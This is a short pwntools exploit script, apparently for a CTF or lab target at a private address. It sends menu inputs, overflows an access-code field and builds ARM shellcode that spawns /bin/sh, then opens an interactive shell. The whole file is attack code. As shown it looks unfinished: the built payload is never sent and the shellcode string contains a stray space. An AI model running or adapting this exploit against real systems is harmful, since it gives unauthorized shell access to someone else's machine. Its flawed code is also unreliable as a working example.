from pwn import *
r = remote('192.168.1.101', 6666)
print r.recvuntil('in:')
r.sendline('11010119921114533x')
r.sendline('1')
r.sendline('1')
r.sendline('0')
print r.recvuntil('Access code:')
r.sendline('X'*50)
r.sendline('1')
payload='\x01`\x8f\xe2\x16\xff/\xe1xF(0\x00\x90\x00!\x01\x91iF\x01\x92\x01\xaa\ x0b\'\x01\xdf\x01\x90\x01\xa9\x04"\x04\'\x01 \x01\xdf\x01\'\x01\xdf' 
payload+='/'*21+'/bin/sh\x00'
raw_input()
r.sendline('ABCDEFGHIGKLMNOPQRST')

r.interactive()
